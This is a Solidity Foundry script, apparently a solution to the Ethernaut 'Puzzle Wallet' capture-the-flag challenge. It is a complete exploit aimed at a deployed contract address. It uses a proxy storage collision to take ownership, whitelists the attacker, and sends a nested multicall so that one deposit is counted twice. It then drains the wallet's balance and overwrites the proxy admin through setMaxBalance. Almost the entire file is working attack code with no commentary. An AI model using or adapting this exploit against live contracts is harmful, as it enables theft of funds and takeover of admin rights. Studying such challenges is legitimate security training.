// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "./PuzzleWallet.sol";

contract PuzzleWalletPOC is Script {
    function run() external {
        address acc = vm.envAddress("AC0");

        vm.startBroadcast(acc);

        PuzzleProxy proxy = PuzzleProxy(
            payable(address(0x95ae1bBBE7387b2296D03Aa056428Be30A3C8dC1))
        );
        // 0x88328cca5baa0743559e0da090c015eed7428eeb
        PuzzleWallet wallet = PuzzleWallet(0x95ae1bBBE7387b2296D03Aa056428Be30A3C8dC1);
        
        uint256 initialWalletBalance = address(wallet).balance;

        proxy.proposeNewAdmin(acc);
        wallet.addToWhitelist(acc);

        // First deposit
        bytes[] memory multicalls = new bytes[](4);
        multicalls[0] = abi.encodeWithSignature("deposit()");

        // Second deposit. Nested "multicall" to circumvent "msg.value" validation
        bytes[] memory nestedMulticalls = new bytes[](1);
        nestedMulticalls[0] = abi.encodeWithSignature("deposit()");
        multicalls[1] = abi.encodeWithSignature("multicall(bytes[])", nestedMulticalls);

        bytes memory withdrawData = abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            acc,
            initialWalletBalance,
            ""
        );
        multicalls[2] = withdrawData;
        multicalls[3] = withdrawData;

        bytes memory data = abi.encodeWithSignature("multicall(bytes[])", multicalls);

        address(wallet).call{value: initialWalletBalance}(data);

        require(address(wallet).balance == 0, "Test: incorrect vallet balance");

        address(wallet).call(abi.encodeWithSignature("setMaxBalance(uint256)", acc));

        require(proxy.admin() == acc, "Test: incorrect proxy admin");

        vm.stopBroadcast();
    }
}
